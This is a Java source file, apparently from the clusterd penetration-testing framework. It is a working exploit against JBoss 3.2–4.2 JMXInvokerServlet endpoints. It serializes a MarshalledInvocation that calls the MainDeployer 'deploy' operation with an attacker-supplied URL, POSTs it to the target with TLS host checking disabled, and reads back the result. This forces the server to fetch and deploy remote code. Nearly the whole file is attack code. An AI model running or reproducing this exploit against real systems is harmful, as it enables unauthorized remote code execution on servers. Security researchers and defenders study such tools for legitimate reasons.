import java.net.URL;
import java.util.Map;
import java.util.HashMap;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;

// jboss
import org.jboss.invocation.InvocationException;
import org.jboss.invocation.MarshalledInvocation;
import org.jboss.invocation.MarshalledValue;
import org.jboss.mx.util.ObjectNameFactory;
import javax.management.ObjectName;

/*
 This application is part of the clusterd attack framework.

 invkdeploy is a modified copy of the invoker code taken from:

    http://breenmachine.blogspot.com/2013/09/jboss-jmxinvokerservlet-exploit.html

 This file takes three arguments: [version] [remote url] [local url], and is called
 from deployer_utils/
 */
public class invkdeploy{
    private static Map<String, Integer> populateHashes(){
        Map<String, Integer> versions = new HashMap<String, Integer>();
        versions.put("3.2", 647347722); // tested against 3.2.7.GA
        versions.put("4.0", 647347722); // tested against 4.0.5.GA
        versions.put("4.2", 647347722); // tested against 4.2.3.GA
        return versions;
    }

    public static void main (String args[]) throws Exception {

        Map<String, Integer> version_hash = populateHashes();

        String version;
        Integer hash;
        String remote_url;
        String local_url;

        Object[] file_list;
        String save_location = "payload.out";

        // parse cli
        try {
            version = (String)args[0]; 
            remote_url = args[1];
            local_url = args[2];

            hash = version_hash.get(version);
            if(hash == null){
                System.out.println("Version unsupported");
                return;
            }
        }
        catch(Exception e){
            System.out.println(e);
            return;
        }

        MarshalledInvocation payload = new MarshalledInvocation();
        payload.setObjectName(version_hash.get(version));  

        Class<?> c = Class.forName("javax.management.MBeanServerConnection");
        Method method = c.getDeclaredMethod("invoke", javax.management.ObjectName.class,
                                                      java.lang.String.class,
                                                      java.lang.Object[].class,
                                                      java.lang.String[].class);
        payload.setMethod(method);

        file_list = new Object[]{ 
                      new javax.management.ObjectName("jboss.system:service=MainDeployer"),
                      "deploy",
                      new String[]{ local_url },
                      new String[]{ "java.lang.String" }
                    };
        payload.setArguments(file_list);

        FileOutputStream fileOut = new FileOutputStream(save_location); 
        ObjectOutputStream out = new ObjectOutputStream(fileOut);
        out.writeObject(payload);
        out.close();
        fileOut.close();

        String type = "application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue";
        URL url = new URL(remote_url);
        HttpURLConnection connection = (HttpURLConnection)url.openConnection();
        TrustModifier.relaxHostChecking(connection);

        connection.setDoOutput(true);
        connection.setRequestMethod("POST");
        connection.setRequestProperty("Content-Type", type);
        connection.setRequestProperty("Content-Length", "10000");
        
        OutputStream os = connection.getOutputStream();
        new ObjectOutputStream(os).writeObject(payload);

        ObjectInputStream in = new ObjectInputStream(connection.getInputStream());
        Object obj = in.readObject();
        if(obj.getClass().toString().equals("class org.jboss.invocation.MarshalledValue")){
            MarshalledValue mv = (MarshalledValue)obj;
            Object mvContent = mv.get();
            if(mvContent != null && mvContent.getClass().toString().equals(
                                    "class org.jboss.invocation.InvocationException")){
                            System.err.println("Invocation Exception");
                            InvocationException ie = (InvocationException)mvContent;
                            System.out.println(ie.getMessage());
                            ie.printStackTrace();
            }
        }
    }
}
